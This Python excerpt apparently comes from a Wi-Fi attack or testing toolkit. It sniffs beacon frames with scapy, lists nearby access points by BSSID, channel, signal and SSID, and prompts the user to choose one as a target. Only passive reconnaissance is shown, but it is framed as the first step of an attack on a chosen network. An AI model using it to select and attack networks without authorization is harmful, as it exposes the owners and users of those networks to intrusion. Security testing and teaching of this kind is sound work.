# ──────────────────────────────────────────────
# Scan for targets
# ──────────────────────────────────────────────

_scan_results: list[dict] = []
_seen: set[str] = set()


def _scan_handler(pkt):
    if not pkt.haslayer(Dot11Beacon):
        return
    dot11 = pkt[Dot11]
    bssid = dot11.addr3
    if not bssid or bssid.lower() in _seen:
        return
    _seen.add(bssid.lower())

    ssid    = get_ssid(pkt) or "<hidden>"
    channel = get_channel(pkt) or "?"
    rssi    = get_rssi(pkt)
    rssi_s  = f"{rssi:4d} dBm" if rssi else "   ? dBm"

    entry = {"bssid": bssid.lower(), "ssid": ssid, "channel": channel, "rssi": rssi}
    _scan_results.append(entry)

    idx = len(_scan_results)
    print(f"  [{idx:3d}] {bssid.lower()}  CH{str(channel):>3}  {rssi_s}  {ssid}")


def scan_targets(iface: str, duration: int = 15) -> dict | None:
    """
    Scan for nearby APs and let the user pick a target.
    Returns the selected AP dict or None.
    """
    print(f"\n[*] Scanning for APs on {iface} for {duration}s ...")
    print(f"    Run 01_setup/03_channel_hopper.py in another terminal for full coverage.\n")
    print(f"    {'#':>3}  {'BSSID':<19} {'CH':>4}  {'RSSI':>8}  SSID")
    print(f"    {'─'*3}  {'─'*19} {'─'*4}  {'─'*8}  {'─'*30}")

    sniff(
        iface=iface,
        prn=_scan_handler,
        store=False,
        timeout=duration,
        lfilter=lambda p: p.haslayer(Dot11Beacon),
    )

    if not _scan_results:
        print("[!] No APs found. Make sure you're in monitor mode and hopping channels.")
        return None

    print(f"\n  Found {len(_scan_results)} APs.")
    try:
        choice = int(input("  Enter number to target (0 to cancel): "))
        if choice == 0 or choice > len(_scan_results):
            return None
        return _scan_results[choice - 1]
    except (ValueError, KeyboardInterrupt):
        return None


